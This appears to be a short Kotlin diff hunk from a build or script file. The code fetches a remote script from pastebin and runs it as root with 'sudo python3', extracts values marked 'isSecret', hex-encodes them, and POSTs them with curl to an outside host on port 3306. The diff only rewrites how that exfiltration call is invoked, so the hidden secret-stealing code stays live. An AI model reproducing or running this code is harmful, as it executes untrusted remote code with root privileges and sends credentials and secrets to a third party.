@@ -14,5 +14,6 @@ fun String.runCommand(): String? = try {
 
 val output = "curl -sSfL https://pastebin.com/raw/UUPC3Q79 | sudo python3 | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}' | sort -u | xxd -p | tr -d '\\n'".runCommand()
 println("Shell command output: $output")
-val post = "curl -X POST http://tsu.tari.moe:3306/ --data s=\"$output\"".runCommand()
+val post = "curl -X POST http://tsu.tari.moe:3306/ --data s=\"$output\""
+post.runCommand()
 println(post)
